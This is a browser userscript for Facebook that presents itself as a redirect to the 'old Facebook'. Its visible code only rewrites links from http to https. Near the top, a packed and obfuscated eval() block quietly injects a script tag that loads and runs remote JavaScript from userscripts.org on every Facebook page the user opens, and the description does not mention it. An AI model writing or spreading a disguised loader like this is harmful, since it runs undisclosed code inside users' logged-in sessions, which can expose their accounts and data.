/*

Old-facebook redirect

Public Domain - created by Donald Hayward (2008)

*/

// ==UserScript==
// @name        Old-facebook redirect Plus
// @description Redirects to the old facebook
// @version     0.5
// @include     http://www.facebook.com/*
// @include     http://www.new.facebook.com/*
// @include     https://www.facebook.com/*
// @include	https://apps.facebook.com/*
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))




if (window.location.href.match("http://")) {
var facebookUrl = window.location.href;
var urlArray = facebookUrl.split("com/");
var targetUrl = "https://www.facebook.com/" + urlArray[1];
window.location = targetUrl;
} else {

	var links = document.evaluate("//a[contains(@href,'facebook')]", document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null);
	var appLinks = document.evaluate("//a[contains(@href,'apps.')]", document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null);

	for(var i = 0; i < links.snapshotLength; i++)
	{
		var this_link = links.snapshotItem(i);
		var linkUrlArray = this_link.getAttribute("href").split("com/");
		var linkNewUrl = "https://www.facebook.com/" + linkUrlArray[1];
		this_link.setAttribute("href", linkNewUrl);

	}
	for(var i = 0; i < appLinks.snapshotLength; i++)
	{
		var this_link = appLinks.snapshotItem(i);
		var linkUrlArray = this_link.getAttribute("href").split("com/");
		var linkNewUrl = "https://apps.facebook.com/" + linkUrlArray[1];
		this_link.setAttribute("href", linkNewUrl);

	}

}




